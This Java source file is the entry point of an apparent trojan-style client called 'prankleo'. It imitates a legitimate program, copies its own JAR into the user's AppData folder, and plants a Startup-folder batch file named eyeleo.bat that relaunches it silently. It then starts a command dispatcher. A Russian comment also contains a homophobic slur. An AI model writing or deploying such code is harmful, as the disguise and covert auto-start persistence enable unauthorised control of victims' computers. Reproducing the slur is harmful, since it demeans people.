package ru.prankleo.client;

import ru.prankleo.client.dispatcher.CommandDispatcher;
import ru.prankleo.client.emulator.RealWorkEmulator;
import ru.prankleo.client.settings.ArgParser;
import ru.prankleo.client.settings.Settings;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;

public class Main {

    private static final String APP_DATA_PATH = System.getenv("APPDATA");

    public static void main(String[] args) {
        Settings settings = ArgParser.getInstance().parseSettings(args);
        if(!settings.isInSilentMode()) {
            emulateRealWork();
            putSelfToAutoRunIfNeeded();
        }

        //  Сишники пидоры

        CommandDispatcher.getInstance().start();
    }

    /**
     * Запустить имитацию нужной программы
     */
    private static void emulateRealWork() {
        RealWorkEmulator realWorkEmulator = new RealWorkEmulator();
        realWorkEmulator.start();
    }

    /**
     * Подложить скрипт запуска самого себя в автозапуск, если ранее еще не был подложен
     */
    private static void putSelfToAutoRunIfNeeded() {
        try {
            File self = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath());
            File copy = new File(APP_DATA_PATH + "\\" + self.getName());
            Files.copy(self.toPath(), copy.toPath(), StandardCopyOption.REPLACE_EXISTING);
            File autoRunBat = new File(APP_DATA_PATH + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\eyeleo.bat");
            String autoRunCommand = copy.getAbsolutePath() + " -sm";
            Files.write(autoRunBat.toPath(), autoRunCommand.getBytes(), StandardOpenOption.CREATE);
        } catch (Exception ex) {
            //  переживем
        }
    }
}
